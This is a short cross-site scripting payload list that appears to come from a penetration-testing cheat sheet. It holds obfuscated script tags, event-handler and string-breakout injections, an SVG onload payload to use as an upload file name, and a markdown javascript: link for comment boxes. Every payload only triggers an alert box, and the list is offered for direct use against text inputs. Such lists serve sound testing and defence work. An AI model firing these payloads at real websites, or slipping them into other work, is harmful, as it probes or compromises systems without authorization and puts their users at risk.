```
&lt;script&gt;alert(&#39;XSS&#39;)&lt;/script&gt;
<scr<!--comment-->ipt>alert('XSS')</scr<!--comment-->ipt>
<input onfocus="alert('XSS')">
<script>setTimeout(function(){alert('XSS')}, 100);</script>
<script>alert(String.fromCharCode(88,83,83));</script>
<script>if(1<2){alert('XSS')}</script>
'}alert(1);{'
'}alert(1)%0A{'
\'}alert(1);{//
/alert(1)/\
/alert(1)}/\
${alert(1)}
'onload=alert(1)><svg/1='
'>alert(1)</script><script/1='
*/alert(1)</script><script>/*
*/alert(1)">'onload="/*<svg/1='
`-alert(1)">'onload="`<svg/1='
*/</script>'>alert(1)/*<script/1='
"><svg onload=alert(1)>.gif //On file upload try this as name
```

Use this where text boxes, comment sections, etc that alows some markup input.

```
[clickme](javascript:alert`1`)
```
